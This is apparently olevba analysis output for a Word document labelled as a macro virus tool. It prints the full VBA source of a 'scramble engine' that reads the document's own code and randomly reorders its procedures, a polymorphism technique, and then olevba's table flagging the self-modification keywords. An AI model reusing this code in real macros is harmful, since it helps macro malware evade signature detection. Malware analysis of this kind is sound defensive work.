olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.CSEV-7a7a1d3935a6e14c2555315434193f0c13116569
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.CSEV-7a7a1d3935a6e14c2555315434193f0c13116569 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function co0kie(co0kielines, co0kieprocs)
Dim co0kie22(99), co0kie23(99)
Set ourco0kie = ThisDocument.VBProject.vbcomponents(1).codemodule
For i = 1 To co0kielines
curco0kie = tmpco0kie: tmpco0kie = ourco0kie.ProcOfLine(i, 1)
If curco0kie <> tmpco0kie Then y = y + 1
co0kie22(y) = co0kie22(y) & ourco0kie.lines(i, 1) & vbCr
Next
For x = 1 To co0kieprocs
co0kie22(x) = Left(co0kie22(x), Len(co0kie22(x)) - 1)
c22 = 0: c23 = 0: c24 = Int(Rnd * (co0kieprocs - x) + 1)
While c22 < c24
If co0kie23(c23 + 1) = "" Then c22 = c22 + 1
c23 = c23 + 1
Wend
co0kie23(c23) = x
Next
For i = 1 To co0kieprocs: co0kie = co0kie & co0kie22(co0kie23(i)) & vbCr: Next
co0kie = Left(co0kie, Len(co0kie) - 1)
End Function
'co0kie scramble engine 0.666
'idea and code by jackie
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

